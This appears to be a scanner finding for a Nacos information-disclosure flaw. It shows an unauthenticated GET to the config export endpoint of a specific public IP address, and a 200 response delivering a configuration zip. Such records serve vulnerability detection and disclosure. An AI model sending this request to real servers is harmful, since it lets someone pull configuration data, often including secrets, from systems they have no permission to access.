info.name: Nacos - Information Disclosure
info.author: s4e-io
info.description: Nacos unauthorized download of configuration information.

req_resp.req:
GET /nacos/v1/cs/configs?export=true&group=&tenant=&appName=&ids=&dataId= HTTP/1.1
HOST: 47.122.7.81
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
req_resp.resp:
HTTP/1.1 200
Content-Security-Policy: script-src 'self'
Content-Disposition: attachment;filename=nacos_config_export_20250321223005.zip
Content-Type: application/octet-stream;charset=UTF-8
Content-Length: 22
Date: Fri, 21 Mar 2025 14:30:05 GMT
Keep-Alive: timeout=60
Connection: keep-alive
